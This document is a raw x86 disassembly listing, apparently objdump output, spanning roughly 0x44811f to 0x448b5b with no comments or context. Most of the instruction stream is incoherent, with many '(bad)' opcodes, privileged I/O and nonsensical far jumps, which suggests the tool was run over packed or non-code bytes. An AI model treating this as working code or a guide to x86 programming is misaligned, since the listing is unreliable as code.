  44811f:	mov    esi,0xd4b7db2a
  448124:	sub    dh,dh
  448126:	mov    bh,0xe7
  448128:	not    cl
  44812a:	iret   
  44812b:	push   edx
  44812c:	push   edi
  44812d:	pop    ebp
  44812e:	mov    bh,0x76
  448130:	loop   0x4480bd
  448132:	xor    eax,0x656ab976
  448137:	(bad)  
  448138:	inc    BYTE PTR [ebx]
  44813a:	xor    al,0xfe
  44813c:	sub    al,al
  44813e:	inc    edi
  44813f:	lds    ebp,FWORD PTR [edx]
  448141:	leave  
  448142:	aaa    
  448143:	shr    BYTE PTR [edx],1
  448145:	jmp    DWORD PTR [ebx+0x9]
  448148:	dec    ebp
  448149:	mov    eax,DWORD PTR [eax-0x1a8b0b2]
  44814f:	add    esp,DWORD PTR [edx+0x0]
  448152:	or     eax,0xce69c501
  448157:	sbb    ah,dl
  448159:	out    0xc2,eax
  44815b:	sbb    al,0xfd
  44815d:	jmp    DWORD PTR [edx+0x9]
  448160:	aad    0x5a
  448162:	into   
  448163:	or     al,0x85
  448165:	ins    BYTE PTR es:[edi],dx
	...
  448182:	add    BYTE PTR [eax],al
  448184:	sub    DWORD PTR [edi],ebx
  448186:	iret   
  448187:	dec    esi
  448188:	jmp    0x3293:0xf513d94b
  44818f:	stc    
  448190:	ficom  DWORD PTR [esi-0x2acff3c1]
  448196:	or     eax,DWORD PTR [eax]
  448198:	fpatan 
  44819a:	inc    edi
  44819b:	int3   
  44819c:	rcr    ebx,1
  44819e:	inc    edi
  44819f:	int3   
  4481a0:	leave  
  4481a1:	sahf   
  4481a2:	xor    BYTE PTR [ebx-0x7a],dl
  4481a5:	jmp    0x448223
  4481a7:	in     al,dx
  4481a8:	add    eax,0x3e07beae
  4481ad:	scas   al,BYTE PTR es:[edi]
  4481ae:	(bad)  
  4481af:	adc    eax,DWORD PTR [ebx-0x62]
  4481b2:	lods   al,BYTE PTR ds:[esi]
  4481b3:	pop    es
  4481b4:	fiadd  WORD PTR [esi-0x36]
  4481b7:	test   BYTE PTR [ebx],dl
  4481b9:	fnstcw WORD PTR [esi-0x411df208]
  4481bf:	repz or al,0x17
  4481c2:	std    
  4481c3:	inc    DWORD PTR [eax+0x657d0cae]
  4481c9:	and    DWORD PTR [ecx-0x2669fc],ebp
  4481cf:	cld    
  4481d0:	dec    ebx
  4481d1:	push   es
  4481d2:	or     BYTE PTR [eax],bh
  4481d4:	push   edx
  4481d5:	hlt    
  4481d6:	pop    es
  4481d7:	test   ebx,ebx
  4481d9:	xor    al,BYTE PTR [esi+0x42161552]
  4481df:	sub    eax,0x53322d09
  4481e4:	add    DWORD PTR [esi+0xfbf],ebx
	...
  448206:	and    eax,DWORD PTR [eax]
  448208:	daa    
  448209:	add    BYTE PTR [edi+0x1a1163f8],ch
  44820f:	sub    edi,esp
  448211:	mov    dh,al
  448213:	pop    ss
  448214:	pusha  
  448215:	retf   0x7506
  448218:	push   ds
  448219:	or     BYTE PTR [edx+0x4e8a8ec2],cl
  44821f:	or     BYTE PTR [eax-0x40],ah
  448222:	out    0x7c,al
  448224:	outs   dx,BYTE PTR ds:[esi]
  448225:	xor    eax,0xfd4da061
  44822a:	xchg   edi,eax
  44822b:	test   bh,ah
  44822d:	add    ecx,DWORD PTR ds:0x380f6400
  448233:	jne    0x4481d0
  448235:	lea    esp,[ecx]
  448237:	jnp    0x4481e4
  448239:	lea    ebx,ds:0x9033a477
  44823f:	call   FWORD PTR [edi-0x40]
  448242:	mov    edx,0xfeaf2082
  448247:	je     0x448283
  448249:	sub    edx,DWORD PTR ds:0xcf361a29
  44824f:	ret    0x411
  448252:	mov    ?,WORD PTR [edi]
  448254:	mov    esi,edi
  448256:	add    eax,0x7ac06dbd
  44825b:	je     0x44827c
  44825d:	xor    BYTE PTR [ebp+0x29],0x7c
  448261:	inc    ebp
  448262:	lea    ebp,[edx-0x201efd17]
  448268:	ins    DWORD PTR es:[edi],dx
  448269:	inc    BYTE PTR [eax]
	...
  448287:	add    cl,ah
  448289:	daa    
  44828a:	fnstenv [eax+0x217511]
  448290:	push   eax
  448291:	cmp    DWORD PTR [esi],edx
  448293:	or     BYTE PTR ds:0x88081c29,al
  448299:	mov    ecx,0xf7df88ea
  44829e:	(bad)  
  44829f:	jmp    0xf3505d6d
  4482a4:	loope  0x448272
  4482a6:	or     esi,DWORD PTR [edx+0x62]
  4482a9:	sub    al,0x59
  4482ab:	aas    
  4482ac:	xor    al,0x83
  4482ae:	jecxz  0x4482e4
  4482b0:	int3   
  4482b1:	ds inc ebx
  4482b3:	xchg   ebp,eax
  4482b4:	adc    DWORD PTR [eax],eax
  4482b6:	add    cl,ch
  4482b8:	xor    eax,0x2124853b
  4482bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4482be:	aaa    
  4482bf:	or     bh,BYTE PTR [edx+ebx*4-0x5b080b21]
  4482c6:	cmp    al,ch
  4482c8:	add    esp,ebp
  4482ca:	(bad)  
  4482cb:	call   0xb5ac8a7a
  4482d0:	repz in al,0xff
  4482d3:	inc    eax
  4482d4:	test   BYTE PTR [ecx+edi*8],ah
  4482d7:	jmp    0x6448bf69
  4482dc:	push   ecx
  4482dd:	lods   al,BYTE PTR ds:[esi]
  4482de:	or     BYTE PTR [edx-0x36],ah
  4482e1:	mul    DWORD PTR [ebp-0x18]
  4482e4:	mov    edi,0x3c51328
  4482e9:	in     eax,0xff
  4482eb:	imul   eax,DWORD PTR [eax],0x0
	...
  448309:	add    BYTE PTR [ebp-0x8],cl
  44830c:	test   BYTE PTR [edx+eax*1+0x400fa918],ah
  448313:	sub    DWORD PTR [ebp+0x57ef12ac],eax
  448319:	in     eax,dx
  44831a:	stos   BYTE PTR es:[edi],al
  44831b:	test   BYTE PTR [esp+ebx*4+0x6250b606],0xbc
  448323:	jl     0x4482ed
  448325:	rcr    ebp,1
  448327:	sub    ecx,edi
  448329:	fiadd  WORD PTR [ebp+0x4b6213c3]
  44832f:	das    
  448330:	xchg   DWORD PTR [ecx],esp
  448332:	adc    eax,0xb700027d
  448337:	jmp    0x446:0x783f74f5
  44833e:	daa    
  44833f:	mov    esp,0xec1c0c2a
  448344:	dec    esp
  448345:	or     al,0x9f
  448347:	cmp    al,0x5
  448349:	mov    esp,edx
  44834b:	repz cli 
  44834d:	into   
  44834e:	aaa    
  44834f:	push   DWORD PTR [ecx]
  448351:	inc    DWORD PTR [ecx-0x8]
  448354:	add    BYTE PTR [ebp-0x7c],0x78
  448358:	dec    eax
  448359:	or     BYTE PTR [edi-0x4c],bh
  44835c:	out    0x4a,eax
  44835e:	jp     0x44834c
  448360:	idiv   BYTE PTR [edx-0x91386]
  448366:	sub    eax,0x700f0551
  44836b:	xor    al,0xf8
  44836d:	inc    DWORD PTR [eax]
	...
  44838b:	add    BYTE PTR [ebx],bh
  44838d:	js     0x4483d4
  44838f:	or     BYTE PTR [ebp+0x5ccb8433],al
  448395:	pusha  
  448396:	idiv   edi
  448398:	sti    
  448399:	fstp   DWORD PTR ds:0xf6ebfbff
  44839f:	and    eax,0x3ff484
  4483a4:	jmp    0x4483eb
  4483a6:	dec    ebp
  4483a7:	push   ss
  4483a8:	fs add cl,ah
  4483ab:	int3   
  4483ac:	push   ebx
  4483ad:	xor    al,0x4c
  4483af:	xor    ebx,DWORD PTR [ebx]
  4483b1:	js     0x4483f7
  4483b3:	and    al,0x60
  4483b5:	idiv   DWORD PTR [edi-0x7b9c9f83]
  4483bb:	push   esp
  4483bc:	inc    eax
  4483bd:	adc    ch,bh
  4483bf:	fsub   DWORD PTR [ebx-0x39]
  4483c2:	jp     0x44839c
  4483c4:	je     0x448369
  4483c6:	inc    ebx
  4483c7:	and    al,0x60
  4483c9:	mov    ds:0x290d2453,eax
  4483ce:	jp     0x448414
  4483d0:	icebp  
  4483d1:	adc    al,0xfa
  4483d3:	mov    edi,0x84c644c0
  4483d8:	loope  0x4483d6
  4483da:	or     esi,ecx
  4483dc:	push   ebp
  4483dd:	gs dec edx
  4483df:	jge    0x448426
  4483e1:	sbb    BYTE PTR [esp+eax*2-0x17],bh
  4483e5:	cld    
  4483e6:	jp     0x44843c
  4483e8:	icebp  
  4483e9:	add    cl,bh
  4483eb:	mov    edi,0x4c7a3098
	...
  44840c:	add    BYTE PTR [eax],al
  44840e:	xor    DWORD PTR [edi],ebp
  448410:	jp     0x448456
  448412:	sub    DWORD PTR [ebx-0xe],eax
  448415:	int    0x2
  448417:	test   eax,0xd386d878
  44841c:	out    0xf,eax
  44841e:	loop   0x4483c8
  448420:	js     0x4483ef
  448422:	neg    BYTE PTR [eax+0x7a]
  448425:	fadd   DWORD PTR [esi-0x79e81ead]
  44842b:	arpl   cx,sp
  44842d:	adc    edx,DWORD PTR [esi-0x23f01ea5]
  448433:	rcl    BYTE PTR [edx-0x29],cl
  448436:	(bad)  
  448438:	push   edx
  448439:	fadd   DWORD PTR [esi]
  44843b:	adc    dh,BYTE PTR [edi+0x78e8a2f3]
  448441:	lock call 0x78ef:0x861be173
  448449:	inc    esp
  44844a:	jmp    0xf26ba7d
  44844f:	call   0x838a8e05
  448454:	loope  0x448469
  448456:	add    ch,BYTE PTR [edi]
  448458:	mov    bl,0x0
  44845a:	ss push ebx
  44845c:	loope  0x44846d
  44845e:	jecxz  0x448477
  448460:	mov    edi,0x6e003f2c
  448465:	dec    ecx
  448466:	les    ebp,FWORD PTR [edx+0x2d3b3ae1]
  44846c:	scas   eax,DWORD PTR es:[edi]
  44846d:	xchg   BYTE PTR [ebx+0x0],ah
  448470:	rol    BYTE PTR cs:[eax],cl
	...
  44848f:	add    ch,ah
  448491:	inc    ecx
  448492:	xlat   BYTE PTR ds:[ebx]
  448493:	add    edx,DWORD PTR [eax+0x217f1425]
  448499:	jg     0x44845e
  44849b:	fld    TBYTE PTR [ecx]
  44849d:	and    eax,0x383d66e7
  4484a2:	es add al,0x92
  4484a5:	rep stos BYTE PTR es:[edi],al
  4484a7:	cmp    edx,eax
  4484a9:	call   FWORD PTR [edi+0x18]
  4484ac:	aad    0x37
  4484ae:	es add al,0x8a
  4484b1:	add    ch,BYTE PTR [ebx+0x7000383b]
  4484b7:	clc    
  4484b8:	mov    dl,0x37
  4484ba:	es add al,0x92
  4484bd:	loop   0x4484e9
  4484bf:	cmp    esp,DWORD PTR [eax]
  4484c1:	add    cl,cl
  4484c3:	jg     0x4484c3
  4484c5:	pop    ss
  4484c6:	das    
  4484c7:	(bad)  
  4484c8:	rcr    BYTE PTR [edx+0x37e90062],cl
  4484ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4484cf:	add    ebp,DWORD PTR [edi]
  4484d1:	je     0x4484b7
  4484d3:	imul   eax,ebp,0xffffffc0
  4484d6:	out    0xa9,al
  4484d8:	xchg   dl,bh
  4484da:	jp     0x448517
  4484dc:	call   0xeec445e0
  4484e1:	outs   dx,DWORD PTR ds:[esi]
  4484e2:	das    
  4484e3:	(bad)  
  4484e4:	call   0xa637:0x66e06a9a
  4484eb:	add    ebp,DWORD PTR [ecx+0x5523e474]
  4484f1:	shl    dh,0x7e
	...
  448510:	add    BYTE PTR [eax],al
  448512:	into   
  448513:	inc    DWORD PTR [ebp+0x57]
  448516:	inc    ebp
  448517:	sar    bh,0xe8
  44851a:	jmp    0x4484dc
  44851c:	add    ecx,DWORD PTR [edx-0x2a]
  44851f:	aaa    
  448520:	cmp    eax,0x7c0dbe9
  448525:	mov    ah,BYTE PTR ds:0xc9e93d38
  44852b:	and    al,0xcd
  44852e:	cld    
  44852f:	es shr esp,0x2e
  448533:	cmp    al,0x3d
  448535:	jmp    0xe9438549
  44853a:	scas   eax,DWORD PTR es:[edi]
  44853b:	inc    edi
  44853c:	enter  0x92a,0x83
  448540:	fsubr  QWORD PTR [esi-0x1b3ddbb0]
  448546:	mov    esi,0x7e93d3e
  44854b:	add    BYTE PTR [eax],al
  44854d:	test   eax,0xaed3ff54
  448552:	shl    BYTE PTR [ebx],1
  448554:	add    cl,ch
  448556:	push   cs
  448557:	add    BYTE PTR [edi-0x1aaed3],bl
  44855d:	pop    edi
  44855e:	mov    cl,BYTE PTR [eax-0x4]
  448561:	data16 sbb al,0x83
  448564:	dec    eax
  448565:	sub    eax,ecx
  448567:	and    ecx,DWORD PTR [eax-0x6dba294]
  44856d:	dec    esi
  44856e:	mov    ds:0x1adcfa23,eax
  448573:	repz aas 
  448575:	jmp    0x44857a
	...
  448592:	add    BYTE PTR [eax],al
  448594:	xchg   esi,eax
  448595:	cmovp  ebp,DWORD PTR [ecx+0x3913290e]
  44859c:	(bad)  
  44859d:	mov    edi,0xff9790ff
  4485a2:	jmp    FWORD PTR [eax]
  4485a4:	fmul   QWORD PTR [esi]
  4485a6:	hlt    
  4485a7:	clc    
  4485a8:	dec    esi
  4485a9:	and    ecx,DWORD PTR [ecx+0xe]
  4485ac:	sbb    al,BYTE PTR [eax-0x5bfff1]
  4485b2:	rol    bl,0x20
  4485b5:	ror    bl,0xcc
  4485b8:	mov    ah,BYTE PTR [ebx+eax*2-0x46dbc7dc]
  4485bf:	jne    0x4485bd
  4485c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4485c2:	dec    ebx
  4485c3:	and    al,0x54
  4485c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4485c6:	inc    ebx
  4485c7:	and    al,0x30
  4485c9:	sub    al,0xcb
  4485cb:	mul    DWORD PTR [ebp-0x5c]
  4485ce:	xlat   BYTE PTR ds:[ebx]
  4485cf:	mov    ebp,eax
  4485d1:	pop    ss
  4485d2:	add    edi,esi
  4485d4:	jne    0x44857a
  4485d6:	out    dx,eax
  4485d7:	mov    esi,DWORD PTR [edi-0x18]
  4485da:	arpl   WORD PTR [esp+eax*2],sp
  4485dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4485de:	(bad)  
  4485df:	mov    ebp,DWORD PTR [edx-0x18]
  4485e2:	arpl   WORD PTR [esp+edx*1],sp
  4485e5:	cld    
  4485e6:	enter  0x3beb,0xa5
  4485ea:	(bad)  
  4485eb:	mov    esi,DWORD PTR [eax]
  4485ed:	sbb    BYTE PTR [ecx],cl
  4485ef:	mov    ebx,DWORD PTR [eax]
  4485f1:	sbb    BYTE PTR ds:0x118288b,al
  4485f7:	rol    DWORD PTR [eax],1
	...
  448615:	add    BYTE PTR [ebp-0x712e2d33],cl
  44861b:	int    0xd7
  44861d:	or     ebx,DWORD PTR ds:0x37f7ed6a
  448623:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448624:	out    dx,eax
  448625:	neg    eax
  448627:	sbb    cl,BYTE PTR ds:0x43a3ec8b
  44862d:	and    al,0xd4
  44862f:	out    0xdd,eax
  448631:	add    edx,DWORD PTR ds:0x883b076d
  448637:	sbb    al,BYTE PTR ds:0x86cac77
  44863d:	cmp    ebp,DWORD PTR [eax+0x1a]
  448640:	add    DWORD PTR [esi-0x63],esi
  448643:	inc    eax
  448644:	and    al,0x44
  448646:	or     eax,0xd9150d35
  44864b:	cmp    al,0x11
  44864d:	sub    eax,0x23c14d56
  448652:	add    eax,0x1923d11e
  448657:	and    cl,BYTE PTR [ecx+esi*8+0x45]
  44865b:	xchg   ebp,eax
  44865c:	dec    edx
  44865d:	add    BYTE PTR [esi-0x79328a92],al
  448663:	aas    
  448664:	jne    0x44862e
  448666:	xchg   esi,eax
  448667:	push   edx
  448668:	retf   0x1dbd
  44866b:	sbb    DWORD PTR [ecx],edi
  44866d:	int3   
  44866e:	dec    ecx
  44866f:	add    eax,0x58ddb4d3
  448674:	mov    ebp,0xce1d37ff
  448679:	dec    esi
	...
  448696:	add    BYTE PTR [eax],al
  448698:	data16 or BYTE PTR [ebp+edi*1+0xd],al
  44869d:	scas   al,BYTE PTR es:[edi]
  44869e:	mov    edi,0xb4b00123
  4486a3:	pop    es
  4486a4:	xchg   esp,eax
  4486a5:	(bad)  
  4486a6:	pop    es
  4486a7:	xchg   DWORD PTR [esi+0x43],esi
  4486aa:	fmul   DWORD PTR [esi+0x5d]
  4486ad:	(bad)  
  4486af:	pop    edx
  4486b0:	push   esp
  4486b1:	fidivr WORD PTR ds:0x53aa0d04
  4486b7:	mov    ebp,0xcc4083d1
  4486bc:	leave  
  4486bd:	jmp    0x4486fe
  4486bf:	int3   
  4486c0:	rcl    ebx,0x3f
  4486c3:	int3   
  4486c4:	fstp   DWORD PTR [esi-0x1c69acd8]
  4486ca:	je     0x448717
  4486cc:	add    eax,0xd55bf7f
  4486d1:	pop    ss
  4486d2:	mov    ds:0x1630c36,eax
  4486d7:	sub    eax,0x853e74cd
  4486dc:	dec    esp
  4486dd:	add    bl,ah
  4486df:	add    dl,BYTE PTR [edx+0x7f]
  4486e2:	(bad)  
  4486e4:	iret   
  4486e5:	jmp    esi
  4486e7:	mov    eax,0x6d34ed75
  4486ec:	adc    bh,bh
  4486ee:	out    0x3,al
  4486f0:	out    dx,eax
  4486f1:	out    0xae,al
  4486f3:	or     edx,DWORD PTR [esp+ecx*4]
  4486f6:	and    eax,0x25c3a37b
  4486fb:	inc    eax
	...
  448718:	add    BYTE PTR [eax],al
  44871a:	dec    ecx
  44871b:	xor    al,0xb3
  44871d:	aas    
  44871e:	inc    ecx
  44871f:	xor    al,0xab
  448721:	aas    
  448722:	pop    ecx
  448723:	xor    al,0x5e
  448725:	fidiv  WORD PTR cs:[ebx+edi*4+0x7a]
  44872a:	into   
  44872b:	imul   DWORD PTR [ebp-0x45]
  44872e:	idiv   ah
  448730:	scas   al,BYTE PTR es:[edi]
  448731:	(bad)  
  448732:	pop    ebp
  448733:	mov    edi,0xf0bcd2da
  448738:	jno    0x4486ee
  44873a:	or     al,0xed
  44873c:	mov    ah,0xd6
  44873e:	xchg   DWORD PTR [esi+ebp*8+0x19298e0b],edi
  448745:	or     ecx,DWORD PTR [eax+0x457adaa2]
  44874b:	hlt    
  44874c:	mov    ebp,0x6df7632c
  448751:	retf   
  448752:	adc    bh,ch
  448754:	(bad)
  448758:	fadd   st(1),st
  44875a:	pop    ecx
  44875b:	inc    eax
  44875c:	por    mm7,QWORD PTR [ebp+ebp*4-0x3f750db2]
  448764:	mov    al,0xca
  448766:	addr16 cmp eax,0x5032fbbd
  44876c:	mov    ebx,0x5318b2c2
  448771:	add    ecx,DWORD PTR ds:0x756a0000
  448777:	and    al,0x0
  448779:	outs   dx,DWORD PTR ds:[esi]
  44877a:	push   cs
  44877b:	add    BYTE PTR [eax-0x17],al
	...
  44879a:	add    BYTE PTR [eax],al
  44879c:	mov    eax,0x3b1e5f18
  4487a1:	daa    
  4487a2:	push   edi
  4487a3:	ins    BYTE PTR es:[edi],dx
  4487a4:	into   
  4487a5:	stos   DWORD PTR es:[edi],eax
  4487a6:	cmp    ah,BYTE PTR [edx+0x45]
  4487a9:	clc    
  4487aa:	and    al,0x2f
  4487ac:	pop    esi
  4487ad:	into   
  4487ae:	out    0x59,eax
  4487b0:	cmp    esp,DWORD PTR [edi]
  4487b2:	stc    
  4487b3:	nop
  4487b4:	push   ecx
  4487b5:	jge    0x448777
  4487b7:	jne    0x4487f0
  4487b9:	jnp    0x4487fb
  4487bb:	or     eax,0xd61917ce
  4487c0:	loope  0x448764
  4487c2:	fucomip st,st(0)
  4487c4:	leave  
  4487c5:	mov    esp,0x26e8cffb
  4487ca:	stc    
  4487cb:	shr    BYTE PTR [ecx],cl
  4487cd:	jnp    0x448812
  4487cf:	int    0xa4
  4487d1:	inc    DWORD PTR [ecx+ebp*8-0x1bc4c6e3]
  4487d8:	push   cs
  4487d9:	add    al,al
  4487db:	idiv   BYTE PTR [edx+0x60]
  4487de:	test   DWORD PTR [eax-0x7e9c7ab4],ebp
  4487e4:	dec    eax
  4487e5:	ret    
  4487e6:	sti    
  4487e7:	(bad)
  4487eb:	mov    edx,0xe976284e
  4487f0:	push   cs
  4487f1:	add    BYTE PTR [ebp+0x7e3d562],bh
  4487f7:	(bad)  
  4487f8:	int    0xe3
  4487fa:	pslld  mm2,QWORD PTR [esi]
  4487fd:	test   DWORD PTR [ebp+eax*1+0x0],ecx
	...
  44881d:	add    BYTE PTR ds:0xd5620693,cl
  448823:	jecxz  0x448828
  448825:	push   esi
  448826:	out    dx,al
  448827:	pop    ebp
  448828:	adc    BYTE PTR [eax],al
  44882a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44882b:	xor    al,dh
  44882d:	loope  0x44884e
  44882f:	int3   
  448830:	add    BYTE PTR [eax+edx*1+0x1c],0xf0
  448835:	fs adc al,bh
  448838:	cli    
  448839:	xlat   BYTE PTR ds:[ebx]
  44883a:	pop    ds
  44883b:	dec    eax
  44883c:	sbb    eax,0xfae32308
  448841:	sar    BYTE PTR [edi-0x73fff03f],cl
  448847:	into   
  448848:	push   0x43
  44884a:	fs addr16 clc 
  44884d:	xor    eax,0x374
  448852:	out    dx,eax
  448853:	inc    edi
  448854:	sbb    eax,0x1d5fed10
  448859:	adc    cl,bl
  44885b:	jle    0x44887a
  44885d:	adc    BYTE PTR [edi],bl
  44885f:	in     al,0x4a
  448861:	push   esi
  448862:	add    esp,DWORD PTR [ebx+0x3e7c043]
  448868:	sub    DWORD PTR [ebp+0x48],eax
  44886b:	adc    BYTE PTR [esi-0x1e9a62b0],bh
  448871:	jmp    ecx
  448873:	jmp    0x4487f7
  448875:	inc    ebp
  448876:	push   0x6afc3cc4
  44887b:	in     al,dx
  44887c:	idiv   bh
  44887e:	jge    0x4488c6
  448880:	icebp  
  448881:	lea    eax,[eax]
	...
  44889f:	add    BYTE PTR [ecx],dh
  4488a1:	aam    0x63
  4488a3:	mov    ds:0x2e4,eax
  4488a8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4488a9:	xchg   edi,eax
  4488aa:	inc    esp
  4488ab:	lock adc BYTE PTR [ebx+0x2f40004],bl
  4488b2:	add    BYTE PTR [ecx+0xb],bl
  4488b5:	dec    ebp
  4488b6:	push   edi
  4488b7:	pop    ebx
  4488b8:	pop    edi
  4488b9:	out    0x54,al
  4488bb:	push   ecx
  4488bc:	not    DWORD PTR [edi-0x5df2aa0a]
  4488c2:	sbb    cl,bh
  4488c4:	inc    eax
  4488c5:	adc    eax,0xc61d732c
  4488ca:	mov    cl,0xb
  4488cc:	stos   BYTE PTR es:[edi],al
  4488cd:	push   ebx
  4488ce:	cmc    
  4488cf:	addr16 int 0x3f
  4488d2:	sar    bh,0x32
  4488d5:	gs cmp eax,0xaff10d3d
  4488db:	cmc    
  4488dc:	mov    bh,ch
  4488de:	jg     0x4488a4
  4488e0:	and    eax,0x30f94054
  4488e5:	icebp  
  4488e6:	or     eax,0x3e920d40
  4488eb:	mov    ebp,0xfffd287d
  4488f0:	or     eax,0xd184d37a
  4488f5:	inc    esp
  4488f6:	add    eax,0xbbb4d05
  4488fb:	test   ecx,ebx
  4488fd:	add    al,0x10
  4488ff:	test   ecx,ecx
  448901:	or     al,0x14
  448903:	sub    eax,0x0
	...
  448920:	add    BYTE PTR [eax],al
  448922:	pop    edi
  448923:	xor    eax,0x91558533
  448928:	mov    edi,0x33561923
  44892d:	test   DWORD PTR [esi],edi
  44892f:	inc    ecx
  448930:	ret    
  448931:	test   BYTE PTR [ebp-0x5f],al
  448934:	(bad)  
  448935:	and    edi,ecx
  448937:	xchg   ecx,eax
  448938:	iret   
  448939:	and    ebx,DWORD PTR ds:0x1123bf92
  44893f:	pop    eax
  448940:	sbb    ecx,edi
  448942:	(bad)  
  448943:	pop    eax
  448944:	sbb    cl,bh
  448946:	aad    0x12
  448948:	cmp    al,0x73
  44894a:	loope  0x4488e2
  44894c:	xor    BYTE PTR [ebp+0x239f9edd],al
  448952:	cmc    
  448953:	mov    eax,ds:0x49853b
  448958:	or     edx,DWORD PTR [eax]
  44895a:	mov    esp,0x3354e626
  44895f:	push   cs
  448960:	push   cs
  448961:	shr    dh,1
  448963:	out    dx,eax
  448964:	sar    ebx,1
  448966:	and    BYTE PTR ds:0xbeebffe,al
  44896c:	mov    cl,0x4
  44896e:	push   edi
  44896f:	rcl    DWORD PTR [edi+edi*2],1
  448972:	iret   
  448973:	mov    esi,0xfffd458d
  448978:	mov    ?,WORD PTR [edi]
  44897a:	add    ecx,eax
  44897c:	out    0x9f,al
  44897e:	mov    ds:0xd03e700,eax
  448983:	mov    al,0x5d
  448985:	rol    BYTE PTR [eax],0x0
	...
  4489a4:	lock outs dx,DWORD PTR cs:[esi]
  4489a7:	cwde   
  4489a8:	lock imul ebx,DWORD PTR cs:[eax+0x23bdf02e],0xffffffc8
  4489b1:	mov    ch,0x91
  4489b3:	jle    0x448983
  4489b5:	pop    ss
  4489b6:	jo     0x448958
  4489b8:	xor    dh,BYTE PTR [eax+0x4546c06d]
  4489be:	sub    al,0x28
  4489c0:	xor    al,0x1d
  4489c2:	retf   0x8a2a
  4489c5:	ret    
  4489c6:	mov    esi,0x430fce78
  4489cb:	addr16 or eax,0x5803e700
  4489d1:	mov    DWORD PTR [esp+esi*1],ebx
  4489d4:	test   eax,0xd03f486
  4489d9:	add    bh,ah
  4489db:	int3   
  4489dc:	gs mov esi,0x414a3d2d
  4489e2:	mov    ah,al
  4489e4:	jb     0x4489dc
  4489e6:	es add al,0xd9
  4489e9:	dec    ebx
  4489ea:	stos   DWORD PTR es:[edi],eax
  4489eb:	aaa    
  4489ec:	ror    DWORD PTR [ebx+0x0],1
  4489ef:	ja     0x448a18
  4489f1:	pop    ss
  4489f2:	stc    
  4489f3:	jmp    0x41448a06
  4489f8:	not    DWORD PTR [esi]
  4489fa:	stc    
  4489fb:	jmp    0x57448a0e
  448a00:	out    0x16,eax
  448a02:	stc    
  448a03:	add    edi,DWORD PTR [edx-0x25]
  448a06:	inc    DWORD PTR [esi]
	...
  448a24:	add    BYTE PTR [eax],al
  448a26:	(bad)  
  448a27:	(bad)  
  448a29:	call   0x36448a3c
  448a2e:	out    0x16,eax
  448a30:	stc    
  448a31:	pop    ebx
  448a32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448a33:	(bad)  
  448a35:	jle    0x448aad
  448a37:	(bad)  
  448a39:	call   0x16448a4c
  448a3e:	daa    
  448a3f:	pop    ss
  448a40:	stc    
  448a41:	retf   0xdcf3
  448a44:	dec    ebp
  448a46:	jmp    0x448a24
  448a48:	(bad)  
  448a49:	call   0xf6448a5c
  448a4e:	and    al,0x17
  448a50:	stc    
  448a51:	sbb    edx,eax
  448a53:	fdiv   st(7),st
  448a55:	mov    esi,0xe8ffdccb
  448a5a:	push   cs
  448a5b:	add    BYTE PTR [eax],al
  448a5d:	(bad)  
  448a5e:	in     al,0x16
  448a60:	stc    
  448a61:	ja     0x448a16
  448a63:	fdiv   st(7),st
  448a65:	bound  ebp,QWORD PTR [ebx+0xee8ffdc]
  448a6b:	add    BYTE PTR [eax],al
  448a6d:	mov    dh,0xe4
  448a6f:	push   ss
  448a70:	stc    
  448a71:	jbe    0x448a09
  448a73:	fdiv   st(7),st
  448a75:	popa   
  448a76:	xchg   bl,bl
  448a78:	(bad)  
  448a79:	call   0x96448a8c
  448a7e:	and    al,0x19
  448a80:	stc    
  448a81:	add    BYTE PTR [esi-0x25],dh
  448a84:	(bad)  
  448a85:	inc    DWORD PTR [ecx]
  448a87:	xchg   edi,eax
  448a88:	cmp    BYTE PTR [eax],al
	...
  448aa6:	add    BYTE PTR [eax],al
  448aa8:	hlt    
  448aa9:	(bad)  
  448aaa:	(bad)  
  448aab:	jmp    DWORD PTR [ebx-0x17]
  448aae:	idiv   bh
  448ab0:	xchg   ecx,eax
  448ab1:	xchg   esi,eax
  448ab2:	cmp    BYTE PTR [eax],al
  448ab4:	and    eax,0xb4003897
  448ab9:	(bad)  
  448aba:	(bad)  
  448abb:	jmp    DWORD PTR [ebx-0x17]
  448abe:	idiv   bh
  448ac0:	pop    ecx
  448ac1:	pushf  
  448ac2:	cmp    BYTE PTR [eax],al
  448ac4:	dec    ebp
  448ac5:	pushf  
  448ac6:	cmp    BYTE PTR [eax],al
  448ac8:	mov    ah,0xff
  448aca:	(bad)  
  448acb:	jmp    ebx
  448acd:	call   0xae1e8ac8
  448ad2:	aas    
  448ad3:	add    BYTE PTR ds:0x74003fae,ch
  448ad9:	(bad)  
  448ada:	(bad)  
  448adb:	jmp    DWORD PTR [ebx]
  448add:	jmp    0xb1e28ad8
  448ae2:	aas    
  448ae3:	add    BYTE PTR [ecx+0x74003fb1],dl
  448ae9:	(bad)  
  448aea:	(bad)  
  448aeb:	jmp    DWORD PTR [ebx-0x18]
  448aee:	idiv   bh
  448af0:	nop
  448af1:	retf   0x3f
  448af4:	and    al,0xcb
  448af6:	aas    
  448af7:	add    BYTE PTR [edi+edi*8],dh
  448afa:	(bad)  
  448afb:	jmp    DWORD PTR [ebx-0x18]
  448afe:	idiv   bh
  448b00:	std    
  448b01:	scas   eax,DWORD PTR es:[edi]
  448b02:	aas    
  448b03:	add    cl,dh
  448b05:	scas   eax,DWORD PTR es:[edi]
  448b06:	aas    
  448b07:	add    BYTE PTR [edi+edi*8],dh
  448b0a:	(bad)  
  448b0b:	inc    DWORD PTR [eax]
	...
  448b29:	add    BYTE PTR [ebx-0x18],ah
  448b2c:	idiv   bh
  448b2e:	and    BYTE PTR [esi-0x5a69ffc1],0x3f
  448b35:	add    ah,dh
  448b37:	(bad)  
  448b38:	(bad)  
  448b39:	dec    DWORD PTR ds:0xf2f92872
  448b3f:	dec    ebp
  448b40:	dec    edx
  448b41:	inc    eax
  448b42:	or     eax,0xd404a62
  448b47:	sub    ebp,edi
  448b49:	dec    DWORD PTR ds:0xd2f92792
  448b4f:	shl    BYTE PTR [edi+edi*1+0xd],1
  448b53:	gs jne 0x448b95
  448b56:	or     eax,0xdfffd29
  448b5b:	mov    dl,0x27
